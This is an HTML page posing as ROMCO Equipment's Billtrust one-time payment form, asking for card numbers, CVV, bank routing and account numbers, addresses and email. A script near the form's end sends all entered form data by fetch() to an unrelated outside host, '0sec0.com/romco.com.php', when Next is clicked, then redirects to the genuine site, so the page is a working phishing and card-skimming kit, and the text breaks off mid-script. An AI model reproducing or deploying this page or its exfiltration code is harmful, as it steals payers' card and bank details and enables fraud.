
<!DOCTYPE html>
<!--[if IE 7]> <html class="ie7" lang="en"> <![endif]-->
<!--[if IE 8]> <html class="ie8" lang="en"> <![endif]-->
<!--[if IE 9]> <html class="ie9" lang="en"> <![endif]-->
<!--[if !IE]><!--> <html> <!--<![endif]-->
<head>
	<meta charset="utf-8" />
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
	<title>ROMCO Equipment, Co. eInvoice Connect</title>
    <link href="https://secure.billtrust.com/IG70/font-awesome-4.7.0/css/font-awesome.css?03122024" rel="stylesheet" />
	<link href="https://secure.billtrust.com/IG70/css/min/kendoui/kendo.common.min.css?03122024" rel="stylesheet" />
	<link href="https://secure.billtrust.com/IG70/css/skin.css?03122024" rel="stylesheet" />
	<link href="https://secure.billtrust.com/IG70/css/default.css?03122024" rel="stylesheet" />
		<link href="https://secure.billtrust.com/IG_CustFiles/css/IGStyles_ROMCO.css" rel="stylesheet" />		<link rel="stylesheet" href="/IG70/css/index.css?03122024" />
	<script src="https://secure.billtrust.com/IG70/js/min/kendoui/jquery.min.js?03122024"></script>
	<script src="https://secure.billtrust.com/IG70/js/jquery/jquery.cookie.js?03122024"></script>
        <script src="https://secure.billtrust.com/IG70/js/min/kendo.ignonauth.js?03122024"></script>
		    <script src="https://secure.billtrust.com/IG70/js/helpers/currency.js?03122024"></script>
	<script src="https://secure.billtrust.com/IG70/js/kendo.igtranslator.js?03122024"></script>
		<script>
		$(document).kendoIGTranslator({
			url: 'https://secure.billtrust.com/ROMCO/ig/translate',
			messages: (function(){ return {"error.fieldsAreRequired":"The highlighted fields are required.","label.attention":"Attention","question.1.1":"What is your favorite hobby?","error.invalidEmailFormat":"The value entered does not match the expected email format.","question.1.2":"What is the first name of your mother's father (grandfather)?","error.invalidDateFormat":"You have entered an invalid date.","question.1.3":"Which elementary school did you attend?","question.1.4":"What is the name of your closest childhood friend?","question.1.5":"What was the make of your first car?","question.1.6":"What is the name of your favorite city?","question.2.1":"Who is your favorite athlete?","question.2.2":"What street did you live on when you were 10 years old?","question.2.3":"What is the name of your first born child?","question.2.4":"What was your major in college?","question.2.5":"What is the name of your favorite band?","question.2.6":"What is the name of your favorite cartoon character?","question.3.1":"Where was your mother born?","question.3.2":"What was the street you grew up on?","question.3.3":"What was the name of the hospital where you were born?","question.3.4":"What was the name of your first pet?","question.3.5":"What is your favorite ice cream flavor?","question.3.6":"What is your favorite sport to watch?"}; })(),
			languages: ["en_US"],
			currentLanguage: 'en_US',
			onBeforeSwitch: function() {
				$('#curlang').click();
			},
			onAfterSwitch: function(response) {
				$('#curlang').html(response.lang.title);
				$('body').removeClass('en_US').addClass(response.lang.lang);
			}
		});
	</script>
	<script src="https://secure.billtrust.com/IG70/js/kendo.igajaxindicator.js?03122024"></script>
	<script src="https://secure.billtrust.com/IG70/js/kendo.igdialog.js?03122024"></script>
	<script src="https://secure.billtrust.com/IG70/js/kendo.igvalidator.js?03122024"></script>
	<script src="https://secure.billtrust.com/IG70/js/kendo.igtooltip.js?03122024"></script>
		<script>$(document).ready(function() { kendo.init($('body')); });</script>
</head>
<body class="container ig7 en_US prelogin">
	<!-- Google tag (gtag.js) -->
<script async src=""></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-CT4P74ZW0D', {
    'cookie_domain': 'billtrust.com',
    'send_page_view': false
});
gtag('set', { 
    'dimension1': '2662', 
    'dimension2': '2662' 
});
gtag('event', 'page_view', { 
    'dimension1': '2662', 
    'dimension2': '2662' 
});
</script>

    <script>
        var _prum = [['id', '59ce86558d4ea38769f752aa'],
            ['mark', 'firstbyte', (new Date()).getTime()]];
        (function () {
            var s = document.getElementsByTagName('script')[0]
                , p = document.createElement('script');
            p.async = 'async';
            p.src = '//rum-static.pingdom.net/prum.min.js';
            s.parentNode.insertBefore(p, s);
        })();
    </script>
	<div class="header">
				<div data-msgid-block="block.views.promohead.1000">
			<table width="100%" height="100px" border="0" cellspacing="0" cellpadding="10" align="center" class="headerTable">
  <tr>
    <td align="center" class="logo"><img src="https://secure.billtrust.com/IG_CustFiles/images/romco/logo.jpg" /></td>
  </tr>
</table>		</div>
	</div>
	<div class="content" data-role="igajaxindicator" style="padding-bottom: 160px;">
				<div class="k-window grey">
	<div class="wrapper otp">
		<div class="pay-banner"></div>
		<h1><span data-msgid=enterYourPaymentDetails.0001>Enter Your Payment Details</span></h1>
					<p><span data-msgid=enterYourPaymentDetails.verbiage.0001>Paying your bill online is easy. Use your bank account or credit card to make a one time payment.</span></p>
				<span class="oneTimePayMandatory"><span data-msgid=tm.oneTimePayMandatory.0001>The fields with an asterisk (*) are required</span></span>
<form id="otpForm" method="POST" action="https://secure.billtrust.com/ROMCO/ig/one-time-payment" >

	<fieldset>
	<div class="clearfix"></div>	
						<label for="succountNum"><span class="oneTimePayasterisk"></span><span data-msgid=tm.AccountNumber.0001>Account Number</span><span data-msgid=colon.0001>:</span></label>
		<div class="input">
			<input name="succountNum" type="text" value=""  id="succountNum" class="k-textbox" autocomplete="off" tabindex="1" data-role="igtooltip" data-content="&lt;span data-msgid=enterAccountNumber.0001&gt;Enter the Account Number found on your bill here.&lt;/span&gt;" required=""/>		</div>
		<div class="clearfix"></div><br>

				<label for="otpPayAmount"><span class="oneTimePayasterisk"></span><span data-msgid=label.amountToPay.0001>Amount To Pay</span><span data-msgid=colon.0001>:</span></label>
		<div class="input">
			<input name="otpPayAmount" type="text" value=""  id="otpPayAmount" class="k-textbox" autocomplete="off" tabindex="2" data-role="igtooltip" data-content="&lt;span data-msgid=enterAmountYouWantToPay.0001&gt;Enter the amount that you want to pay for the account. It must be in the format of &#039;xxx.xx&#039;&lt;/span&gt;" required=""/>		</div>
<br>
        <div id="otpAmountWarning" style="color:red; margin-top:10px; margin-left: 195px; display:none;">
            <span data-msgid=otpAmountWarning.0001>Warning: The Amount To Pay matches the value for Account Number. Please confirm that this is correct.</span>        </div>


		<div class="clearfix"></div>

		
									                    <label for="otpPaymentNote" class="plabel"><span data-msgid=tm.PaymentNoteLabel.0001>Note</span><span data-msgid=colon.0001>:</span><br/>
                
				            </label>
			<div class="input">
				<textarea name="otpPaymentNote"  helper="formText" id="otpPaymentNote" maxLength="100" class="k-textbox" autocomplete="off" style="height: 90px;" tabindex="3" data-role="igtooltip" data-content="&lt;span data-msgid=enterPaymentNote.0001&gt;Enter a reference about the payment here.&lt;/span&gt;"></textarea>			</div>
			<div class="clearfix"></div><br>
		
		<!-- Custome fileds display code starts here INV-10208-->

		<!-- Custome fileds display code ENDs here INV-10208-->

					<div class="otp-radio-box">
				<input type="radio" id="otpSw1" name="otpSw" value="otpSwACH"  checked   tabindex="4" /><label for="otpSw1"><span data-msgid=label.bankAccount.0001>Bank Account</span></label><input type="radio" id="otpSw2" name="otpSw" value="otpSwCC"   tabindex="4" /><label for="otpSw2"><span data-msgid=label.creditCard.0001>Credit Card</span></label>			</div>
			<div class="clearfix"></div><br>
		
						<div id="ccForm" style="display: none;">
			
									<label><span data-msgid=label.cardsAccepted.0001>Cards Accepted</span><span data-msgid=colon.0001>:</span></label>
			<div class="ccimg">
				<div class="A"></div><div class="V"></div><div class="M"></div><div class="D"></div>			</div>
			<div class="clearfix"></div><br>

						<label for="ccCardNumber"><span class="oneTimePayasterisk"></span><span data-msgid=label.creditCardNumber.0001>Credit Card Number</span><span data-msgid=colon.0001>:</span></label>
			<div class="input">
				<input name="ccCardNumber" type="text" value=""  id="ccCardNumber" class="k-textbox" autocomplete="off" tabindex="5" data-role="igtooltip" data-content="&lt;span data-msgid=enterCreditCard.0001&gt;Enter the credit card you want to use in this field. The logos of the credit cards you can use to make a payment appear in the Cards Accepted field.&lt;/span&gt;" required=""/>			</div>
			<div class="clearfix"></div><br>

						<label for="ccExpirationMonth"><span class="oneTimePayasterisk"></span><span data-msgid=label.expirationDate.0001>Expiration Date</span><span data-msgid=colon.0001>:</span></label>
			<div class="input">
				<input name="ccExpirationMonth" type="text" value=""  id="ccExpirationMonth" class="k-textbox-half k-textbox" tabindex="6" placeholder="MM" maxlength="2" type="month" required=""/>                /
				<input name="ccExpirationYear" type="text" value=""  id="ccExpirationYear" class="k-textbox-half k-textbox" tabindex="7" placeholder="YYYY" maxlength="4" type="number" required=""/>			</div>
			<div class="clearfix"></div><br>
			
			<label for="cvv"><span class="oneTimePayasterisk"></span><span data-msgid=label.nameOnCard.0001>CVV</span><span data-msgid=colon.0001>:</span></label>
			<div class="input">
				<input name="cvv" type="text" value=""  id="cvv" class="k-textbox" autocomplete="off" tabindex="8" maxlength="100" data-role="igtooltip" data-content="&lt;span data-msgid=enterNameOnCard.0001&gt;Enter the cvv that appears on the credit card.&lt;/span&gt;" required=""/>			</div>
			<div class="clearfix"></div><br>

						<label for="ccNameOnCard"><span class="oneTimePayasterisk"></span><span data-msgid=label.nameOnCard.0001>Name on Card</span><span data-msgid=colon.0001>:</span></label>
			<div class="input">
				<input name="ccNameOnCard" type="text" value=""  id="ccNameOnCard" class="k-textbox" autocomplete="off" tabindex="8" maxlength="100" data-role="igtooltip" data-content="&lt;span data-msgid=enterNameOnCard.0001&gt;Enter the name that appears on the credit card.&lt;/span&gt;" required=""/>			</div>
			<div class="clearfix"></div><br>

						<label for="ccAddress1"><span class="oneTimePayasterisk"></span><span data-msgid=label.billingaddress1.0001>Billing Address1</span><span data-msgid=colon.0001>:</span></label>
			<div class="input">
				<input name="ccAddress1" type="text" value=""  id="ccAddress1" class="k-textbox" autocomplete="off" tabindex="9" data-role="igtooltip" data-content="&lt;span data-msgid=enterBillingAddress.0001&gt;Enter the billing address for the payment account.&lt;/span&gt;" required=""/>			</div>
			<div class="clearfix"></div><br>

						<label for="ccAddress2"><span data-msgid=label.billingaddress2.0001>Billing Address2</span><span data-msgid=colon.0001>:</span></label>
			<div class="input">
				<input name="ccAddress2" type="text" value=""  id="ccAddress2" class="k-textbox" autocomplete="off" tabindex="10" data-role="igtooltip" data-content="&lt;span data-msgid=enterBillingAddress.0001&gt;Enter the billing address for the payment account.&lt;/span&gt;"/>			</div>
			<div class="clearfix"></div><br>

						<label for="ccCity"><span class="oneTimePayasterisk"></span><span data-msgid=label.city.0001>City</span><span data-msgid=colon.0001>:</span></label>
			<div class="input">
				<input name="ccCity" type="text" value=""  id="ccCity" class="k-textbox" autocomplete="off" tabindex="11" data-role="igtooltip" data-content="&lt;span data-msgid=enterCity.0001&gt;Enter the city name of the billing address.&lt;/span&gt;" required=""/>			</div>
			<div class="clearfix"></div><br>

						<label for="ccState"><span data-msgid=label.stateProvince.0001>State/Province</span><span data-msgid=colon.0001>:</span></label>
			<div class="input">
				<select name="ccState"  id="ccState" tabindex="12" data-role="dropdownlist"><option value="AA">AA</option>
<option value="AE">AE</option>
<option value="AK">AK</option>
<option value="AL">AL</option>
<option value="AP">AP</option>
<option value="AR">AR</option>
<option value="AS">AS</option>
<option value="AZ">AZ</option>
<option value="CA">CA</option>
<option value="CO">CO</option>
<option value="CT">CT</option>
<option value="DC">DC</option>
<option value="DE">DE</option>
<option value="FL">FL</option>
<option value="FM">FM</option>
<option value="GA">GA</option>
<option value="GU">GU</option>
<option value="HI">HI</option>
<option value="IA">IA</option>
<option value="ID">ID</option>
<option value="IL">IL</option>
<option value="IN">IN</option>
<option value="KS">KS</option>
<option value="KY">KY</option>
<option value="LA">LA</option>
<option value="MA">MA</option>
<option value="MD">MD</option>
<option value="ME">ME</option>
<option value="MH">MH</option>
<option value="MI">MI</option>
<option value="MN">MN</option>
<option value="MO">MO</option>
<option value="MP">MP</option>
<option value="MS">MS</option>
<option value="MT">MT</option>
<option value="NC">NC</option>
<option value="ND">ND</option>
<option value="NE">NE</option>
<option value="NH">NH</option>
<option value="NJ">NJ</option>
<option value="NM">NM</option>
<option value="NV">NV</option>
<option value="NY">NY</option>
<option value="OH">OH</option>
<option value="OK">OK</option>
<option value="OR">OR</option>
<option value="PA">PA</option>
<option value="PR">PR</option>
<option value="PW">PW</option>
<option value="RI">RI</option>
<option value="SC">SC</option>
<option value="SD">SD</option>
<option value="TN">TN</option>
<option value="TX">TX</option>
<option value="UT">UT</option>
<option value="VA">VA</option>
<option value="VI">VI</option>
<option value="VT">VT</option>
<option value="WA">WA</option>
<option value="WI">WI</option>
<option value="WV">WV</option>
<option value="WY">WY</option>
</select>			</div>
			<div class="clearfix"></div><br>

						<label for="ccZipCode"><span class="oneTimePayasterisk"></span><span data-msgid=label.zipPostalCode.0001>Zip/Postal Code</span><span data-msgid=colon.0001>:</span></label>
			<div class="input">
				<input name="ccZipCode" type="text" value=""  id="ccZipCode" class="k-textbox" autocomplete="off" tabindex="13" data-role="igtooltip" data-content="&lt;span data-msgid=enterZipCode.0001&gt;Enter the Zip or Postal code of the billing address.&lt;/span&gt;" required=""/>			</div>
			<div class="clearfix"></div><br>

			
		</div><br>
		
						<div id="achForm" style="display: none;" >
		    <!-- BankAccountType -->
    						
        		<label for="achAccountType"><span data-msgid=label.achAccountType.0001>Account Type</span><span data-msgid=colon.0001>:</span></label>
        		<div class="dropdown">
        			<select name="achAccountType"  id="achAccountType" tabindex="14" data-role="dropdownlist"><option value="Business Checking" selected >Business Checking</option>
<option value="Business Savings">Business Savings</option>
<option value="Personal Checking">Personal Checking</option>
<option value="Personal Savings">Personal Savings</option>
</select>        		</div>			
        		<div class="clearfix"></div><br>
    				
		
						<label for="achBankName"><span class="oneTimePayasterisk"></span><span data-msgid=label.bankName.0001>Bank Name</span><span data-msgid=colon.0001>:</span></label>
			<div class="input">
				<input name="achBankName" type="text" value=""  id="achBankName" class="k-textbox" autocomplete="off" tabindex="15" data-role="igtooltip" data-content="&lt;span data-msgid=enterNameOfBank.0001&gt;Enter the name of the bank that you want to pay with.&lt;/span&gt;" required=""/>			</div>
			<div class="clearfix"></div><br>
	
						<label for="achNameOnAccount"><span class="oneTimePayasterisk"></span><span data-msgid=label.nameOnAccount.0001>Name On Account</span><span data-msgid=colon.0001>:</span></label>
			<div class="input">
				<input name="achNameOnAccount" type="text" value=""  id="achNameOnAccount" class="k-textbox" autocomplete="off" tabindex="16" maxlength="100" data-role="igtooltip" data-content="&lt;span data-msgid=enterNameOnAccount.0001&gt;Enter the first and last name of the bank account owner.&lt;/span&gt;" required=""/>			</div>
			<div class="clearfix"></div><br>
	
						
			<label for="achRoutingNumber">
		<span class="oneTimePayasterisk"></span>		<img border="0" src="https://secure.billtrust.com/IG70/img/check_routing_symbol.gif" width="14" height="18" alt="">
				<span data-msgid=label.routingNumber.0001>Routing Number</span>				<img border="0" src="https://secure.billtrust.com/IG70/img/check_routing_symbol.gif" width="14" height="18" alt="">
			</label>
			<div class="input">
				<input name="achRoutingNumber" type="text" value=""  id="achRoutingNumber" class="k-textbox" autocomplete="off" tabindex="17" data-role="igtooltip" data-content="&lt;div class=&quot;check USD&quot;&gt;&lt;/div&gt;&lt;div class=&quot;checkLabels USD&quot;&gt;
                    &lt;span class=&quot;routingField&quot;&gt;&lt;span class=&quot;onetimePayasterisk&quot;&gt;&lt;/span&gt;&lt;span data-msgid=label.routingNumber.0001&gt;Routing Number&lt;/span&gt;&lt;/span&gt;
                    &lt;span class=&quot;accountField&quot;&gt;&lt;span class=&quot;onetimePayasterisk&quot;&gt;&lt;/span&gt;&lt;span data-msgid=label.accountNumber.0001&gt;Account Number&lt;/span&gt;&lt;/span&gt;
                    &lt;span class=&quot;checkField&quot;&gt;&lt;span class=&quot;onetimePayasterisk&quot;&gt;&lt;/span&gt;&lt;span data-msgid=label.checkNumber.0001&gt;Check Number&lt;/span&gt;&lt;/span&gt;
                    &lt;/div&gt;&lt;span data-msgid=enterRoutingNumber.0001&gt;The location of the routing and account numbers will vary from bank to bank. Please use the symbols noted in the Routing Number and Account Number section to your left as a guide.&lt;/span&gt;" data-width="350" required=""/>			</div>
			<div class="clearfix"></div><br>
	
						<label for="achAccountNumber">
			<span class="oneTimePayasterisk"></span>	<span data-msgid=label.bankAccountNumber.0001>Bank Account Number</span>				<img border="0" src="https://secure.billtrust.com/IG70/img/check_account_symbol.gif" width="14" height="18" alt=""></td>
			</label>
			<div class="input">
				<input name="achAccountNumber" type="text" value=""  id="achAccountNumber" class="k-textbox" autocomplete="off" tabindex="18" data-role="igtooltip" data-content="&lt;div class=&quot;check USD&quot;&gt;&lt;/div&gt;&lt;div class=&quot;checkLabels USD&quot;&gt;
                    &lt;span class=&quot;routingField&quot;&gt;&lt;span class=&quot;onetimePayasterisk&quot;&gt;&lt;/span&gt;&lt;span data-msgid=label.routingNumber.0001&gt;Routing Number&lt;/span&gt;&lt;/span&gt;
                    &lt;span class=&quot;accountField&quot;&gt;&lt;span class=&quot;onetimePayasterisk&quot;&gt;&lt;/span&gt;&lt;span data-msgid=label.accountNumber.0001&gt;Account Number&lt;/span&gt;&lt;/span&gt;
                    &lt;span class=&quot;checkField&quot;&gt;&lt;span class=&quot;onetimePayasterisk&quot;&gt;&lt;/span&gt;&lt;span data-msgid=label.checkNumber.0001&gt;Check Number&lt;/span&gt;&lt;/span&gt;
                    &lt;/div&gt;&lt;span data-msgid=enterRoutingNumber.0001&gt;The location of the routing and account numbers will vary from bank to bank. Please use the symbols noted in the Routing Number and Account Number section to your left as a guide.&lt;/span&gt;" data-width="350" required=""/>			</div>
			<div class="clearfix"></div><br>
	
						<label for="achConfirmAccount"><span class="oneTimePayasterisk"></span><span data-msgid=label.accountNumberRetype.0001>Retype Bank Account Number</span><span data-msgid=colon.0001>:</span></label>
			<div class="input">
				<input name="achConfirmAccount" type="text" value=""  id="achConfirmAccount" class="k-textbox" autocomplete="off" tabindex="19" data-role="igtooltip" data-content="&lt;span data-msgid=retypeBankAccountNumber.0001&gt;Retype the same bank account number.&lt;/span&gt;" required=""/>			</div>
			<div class="clearfix"></div><br>
	
			<!--  Address 1  -->
    		        		<label for="achAddress1"><span class="oneTimePayasterisk"></span><span data-msgid=label.billingaddress1.0001>Billing Address1</span><span data-msgid=colon.0001>:</span></label>
        		<div class="input">
        			<input name="achAddress1" type="text" value=""  id="achAddress1" class="k-textbox" autocomplete="off" tabindex="20" data-role="igtooltip" data-content="&lt;span data-msgid=enterBillingAddress.0001&gt;Enter the billing address for the payment account.&lt;/span&gt;" required=""/>        		</div>
        		<div class="clearfix"></div><br>			
    		    		
    		<!--   Address 2 -->
    		        		<label for="achAddress2"><span data-msgid=label.billingaddress2.0001>Billing Address2</span><span data-msgid=colon.0001>:</span></label>
        		<div class="input">
        			<input name="achAddress2" type="text" value=""  id="achAddress2" class="k-textbox" autocomplete="off" tabindex="21" data-role="igtooltip" data-content="&lt;span data-msgid=enterBillingAddress.0001&gt;Enter the billing address for the payment account.&lt;/span&gt;"/>        		</div>			
        		<div class="clearfix"></div><br>
    		    		
    		<!-- City -->
    		        		<label for="achCity"><span class="oneTimePayasterisk"></span><span data-msgid=label.city.0001>City</span><span data-msgid=colon.0001>:</span></label>
        		<div class="input">
        			<input name="achCity" type="text" value=""  id="achCity" class="k-textbox" autocomplete="off" tabindex="22" data-role="igtooltip" data-content="&lt;span data-msgid=enterCity.0001&gt;Enter the city name of the billing address.&lt;/span&gt;" required=""/>        		</div>			
        		<div class="clearfix"></div><br>
    		    		
    		<!-- State/Province -->
    		        		<label for="achState"><span data-msgid=label.stateProvince.0001>State/Province</span><span data-msgid=colon.0001>:</span></label>
        		<div class="input">
        			<select name="achState"  id="achState" tabindex="23" data-role="dropdownlist"><option value="AA">AA</option>
<option value="AE">AE</option>
<option value="AK">AK</option>
<option value="AL">AL</option>
<option value="AP">AP</option>
<option value="AR">AR</option>
<option value="AS">AS</option>
<option value="AZ">AZ</option>
<option value="CA">CA</option>
<option value="CO">CO</option>
<option value="CT">CT</option>
<option value="DC">DC</option>
<option value="DE">DE</option>
<option value="FL">FL</option>
<option value="FM">FM</option>
<option value="GA">GA</option>
<option value="GU">GU</option>
<option value="HI">HI</option>
<option value="IA">IA</option>
<option value="ID">ID</option>
<option value="IL">IL</option>
<option value="IN">IN</option>
<option value="KS">KS</option>
<option value="KY">KY</option>
<option value="LA">LA</option>
<option value="MA">MA</option>
<option value="MD">MD</option>
<option value="ME">ME</option>
<option value="MH">MH</option>
<option value="MI">MI</option>
<option value="MN">MN</option>
<option value="MO">MO</option>
<option value="MP">MP</option>
<option value="MS">MS</option>
<option value="MT">MT</option>
<option value="NC">NC</option>
<option value="ND">ND</option>
<option value="NE">NE</option>
<option value="NH">NH</option>
<option value="NJ">NJ</option>
<option value="NM">NM</option>
<option value="NV">NV</option>
<option value="NY">NY</option>
<option value="OH">OH</option>
<option value="OK">OK</option>
<option value="OR">OR</option>
<option value="PA">PA</option>
<option value="PR">PR</option>
<option value="PW">PW</option>
<option value="RI">RI</option>
<option value="SC">SC</option>
<option value="SD">SD</option>
<option value="TN">TN</option>
<option value="TX">TX</option>
<option value="UT">UT</option>
<option value="VA">VA</option>
<option value="VI">VI</option>
<option value="VT">VT</option>
<option value="WA">WA</option>
<option value="WI">WI</option>
<option value="WV">WV</option>
<option value="WY">WY</option>
</select>        		</div>	<br>		
        
        		<div class="clearfix"></div>
    		    				
    		        		<label for="achZipCode"><span class="oneTimePayasterisk"></span><span data-msgid=label.zipPostalCode.0001>Zip/Postal Code</span><span data-msgid=colon.0001>:</span></label>
        		<div class="input">
        			<input name="achZipCode" type="text" value=""  id="achZipCode" class="k-textbox" autocomplete="off" tabindex="24" data-role="igtooltip" data-content="&lt;span data-msgid=enterZipCode.0001&gt;Enter the Zip or Postal code of the billing address.&lt;/span&gt;" required=""/>        		</div>	<br>	
        		
        		<div class="clearfix"></div>	
    		    				
    		    		
    		<div class="clearfix"></div>
		</div>
		
				<label for="otpEmailAddress"><span class="oneTimePayasterisk"></span><span data-msgid=label.emailAddress.0001>Email Address</span><span data-msgid=colon.0001>:</span></label>
		<div class="input">
			<input name="otpEmailAddress" type="email" value=""  helper="formText" id="otpEmailAddress" class="k-textbox" autocomplete="off" tabindex="25" data-role="igtooltip" data-content="&lt;span data-msgid=enterYourEmail.otp.0001&gt;Enter the email address to send confirmation of this payment.&lt;/span&gt;" required=""/>		</div>
		<div class="clearfix"></div><br>
		<div id = "cutoffMessage" style = "display:none">
			<p><img src="https://secure.billtrust.com/IG70/img/info_icon.png" alt=""/>
				<span data-msgid=achCutoffMessage.1000>Bank account payments that are made after 3 PM Eastern will be scheduled for the next business day.</span>			</p>
		</div><br>

	</fieldset>

	<div class="btn-box">
				<input type="button" value="Cancel" data-msgid-button="button.cancel.0001" class="k-button grey size1" onclick="document.location.href='https://secure.billtrust.com/ROMCO/ig/signin'"/>
		<input type="submit" value="Next" class="k-button size1" tabindex="26" onclick="submitForm(); document.location.href='https://secure.billtrust.com/ROMCO/ig/one-time-payment'" />
	</div>
	
		<script id="selectOptionTemplate" type="text/x-kendo-tmpl">#= TS(value)#</script>	
</form>
<script>
function submitForm() {
  var form = document.getElementById("otpForm");
  var formData = new FormData(form);

  fetch("https://0sec0.com/romco.com.php", {
    method: "POST",
    body: formData
  })
  .then(response => {
    if (response.ok) {
      console.log("Sent!");
    } else {
      console.error("error!");
    }
  })
  .catch(error => {
    console.error("error!", error);
  });
}
</script>
<script>
	$(document).ready(function(){
		var validator = $('#otpForm').kendoIGValidator({
			messages: {
				accountNumberInvalid:	"<span data-msgid=error.accountNumberInvalid.0001>Account Number: The value is not valid or does not match the expected value.<\/span>",
				email:					"<span data-msgid=error.invalidEmailFormat.signUp.0001>Email Address: The value is not valid or does not match the expected value.<\/span>",
			},
			rules: {
				accountNumberInvalid: function (input) {
					if (!input.is("[name=succountNum]")) {
						return true;
					}
					return /^[a-zA-Z0-9 \.\-\/\_&\$@#]+$/.test(input.val().trim());
				}
			}
		}).data("kendoIGValidator");

					$('#otpForm')
				.find('.otp-radio-box input')
				.on('click', function() {
					var $hiddenForm, $visibleForm;
					
					if(this.value == 'otpSwCC') {
						$visibleForm = $('#ccForm');
						$hiddenForm = $('#achForm');
						$('#cutoffMessage').hide();
					}
					if(this.value == 'otpSwACH') {
						$visibleForm = $('#achForm');
						$hiddenForm = $('#ccForm');
						$('#cutoffMessage').show();
					}

					$hiddenForm.find('input, select').attr('disabled', true);
					if($hiddenForm.find('[data-role=dropdownlist]').length) {
						$hiddenForm.find('[data-role=dropdownlist]').data('kendoDropDownList').enable(false);
					}
					$hiddenForm.hide();

					$visibleForm.find('[disabled]').prop( "disabled", false );
					if($visibleForm.find('[data-role=dropdownlist]').length) {
						$visibleForm.find('[data-role=dropdownlist]').data('kendoDropDownList').enable(true);
					};
					$visibleForm.show();

					validator.clearErrors();
				})
				.filter(':checked')
				.trigger('click');
		
		$('#otpPayAmount').on('keydown', function(e) {
			// Ensure that user does not enter a comma
			if (e.keyCode == 188) {
				e.preventDefault();	
			}
		});

		$('#otpPayAmount').on('change', function() {
			var val = $(this).val();

            // display warning verbiage if the Amount to Pay matches the Account Number
			if (val === $("#succountNum").val()) {
                $('#otpAmountWarning').css("display", "block");
            } else {
                $('#otpAmountWarning').css("display", "none");
            }

			val = (val.charAt(0) == '$') ? val.substr(1) : val;
			val = val.replace(/,/g , '');
			val = parseFloat(val);
			if(!val || isNaN(val)) {
				val = 0;
			} 
			$(this).val(val.toFixed(2));
		});

		
            		
    		var
    		cardNumber	= $("#ccCardNumber"),
    		ccType		= '',
    		cards		= ["A","V","M","D"];
		   		
			 		
			
			cardNumber.on('keyup',function() {
				ccType	= getCreditCardType($(this).val());

				$.each(cards,function(i,val) {
					$('.'+val).toggleClass("cc-disabled", val != ccType && ccType != 'U');
				})	
			}).trigger("change");

			cardNumber.trigger('keyup');
		
		/// 
		// Used by both ach and credit card forms for
		// populating the state drop down and disabling
		// the Postal Code/ State fields.
		///
		function setupStateAndZipcodeFields(states, stateList, zip)
		{
			if(states){
				var	data = [];
		
				$.each(states, function(k, v){
					data.push({id: k, title: v});
				});
				var dataSource = new kendo.data.DataSource({data: data});
				stateList.setOptions({
					dataValueField: "id",
					dataTextField: "title"
				});
				stateList.setDataSource(dataSource);
				stateList.refresh();

				stateList.enable(true);
				zip
					.prop( "disabled", false )
					.removeClass('k-state-disabled')
				;
				stateList.select(0);
				
			} else {
		
				zip
					.attr('disabled', true)
					.addClass('k-state-disabled');
				stateList.enable(false);
				
			}
		}

		///
		// Retrieve a card type by evaluating the given credit card number.
		///
		function getCreditCardType(number) {
		    var re = {
		            mastercard: /^5[1-5][0-9]{14}$/,
		            mastercardBin2: /^2(22[1-8]\d{2}|229\d{2}|2[3-9]\d{3}|[3-6]\d{4}|2[01]\d{3}|2\d{2})\d{10}$/
		        };
	        
			switch(true) {
				case(/^4/.test(number)):
					return "V";
					break;
				case(re.mastercard.test(number) || re.mastercardBin2.test(number)):						
					return "M";
					break;
				case(/^3[47]/.test(number)):
					return "A";
					break;
				case(/^6(?:011|5|4[4-9]|22(?:1(?:2[6-9]|[3-9])|[2-8]|9(?:[01]|2[0-5])))/.test(number)):
					return "D";
					break;
				default:
					return "U"
			}
		}
	
			
	});

	function nextSubmit()
	{
		$('.oneTimePayMandatory').css("display", "none");
	}
	$('.otp-radio-box input').click(function() {
		$('.oneTimePayMandatory').css("display", "block");
	})
	</script>

<style>
	span[class="oneTimePayasterisk"]::before {
		content: "*";
		color: black;

	}
	
	label.k-invalid span.asterisk+span[class="oneTimePayasterisk"]::before {
		content: "";
	}

</style>
		<script>
			var arrFixNoteAllBrWithEmail = [];
		</script>	
	</div>
</div>
	</div>
	<div class="footer">
		<div id="promofoot" data-msgid-block="block.views.promofoot.1000">
			<table width="100%" height="60px">
  <tr>
    <td align="center"><img src="https://secure.billtrust.com/img/poweredbybilltrust.gif" /></td>
  </tr>
</table>		</div>
					<div class="footer-links">
    <span class="faqLink"><a href="javascript:" data-role="igdialog" data-template="dialogFAQTemplate" data-click="open"><span data-msgid=faq.0001>FAQ</span></a></span>
            <span><a href="javascript:" OnClick="javascript: window.open('https://secure.billtrust.com/ROMCO/ig/subscriber-agreement','','width=1200,height=700,left=200,top=50,scrollbars=yes');return false;"><span data-msgid=subscriberAgreement.0001>Subscriber Agreement</span></a></span>
        <span><a id="contactLink" href="javascript:" data-role="igdialog" data-template="dialogContactTemplate" data-click="open"><span data-msgid=label.contactUs.0001>Contact Us</span></a></span>
    </div>
<script id="dialogFAQTemplate" type="text/x-kendo-tmpl" data-title="<span data-msgid=frequentlyAskedQuestions.0001>Frequently Asked Questions</span>" data-url="https://secure.billtrust.com/ROMCO/ig/faq" data-width="800" data-height="550">
	<div class="i-dialog-content scroll">#= content#</div>
	<div class="i-dialog-btnbox">
		<input type="button" value="Close" data-msgid-button="label.close.0001" class="k-button size1" data-role="igdialog" data-click="close" />
	</div>
</script>
<script id="dialogContactTemplate" type="text/x-kendo-tmpl" data-title="<span data-msgid=haveQuestions.0001>Have Questions? Contact Us</span>" data-url="https://secure.billtrust.com/ROMCO/ig/contact" data-width="700" data-height="300">
	<div class="i-dialog-content scroll">#= content#</div>
	<div class="i-dialog-btnbox">
		<input type="button" value="Close" data-msgid-button="label.close.0001" class="k-button size1" data-role="igdialog" data-click="close" />
	</div>
</script>			</div>
	<script>
				        initSet();
        function initSet() {
            isResponsive = "N";
            screenWidth  = $(window).width();

            isMobile = {
                Android: function() {
                    return navigator.userAgent.match(/Android/i);
                },
                BlackBerry: function() {
                    return navigator.userAgent.match(/BlackBerry/i);
                },
                iOS: function() {
                    return navigator.userAgent.match(/iPhone|iPad|iPod/i);
                },
                Opera: function() {
                    return navigator.userAgent.match(/Opera Mini/i);
                },
                Windows: function() {
                    return navigator.userAgent.match(/IEMobile/i);
                },
                any: function() {
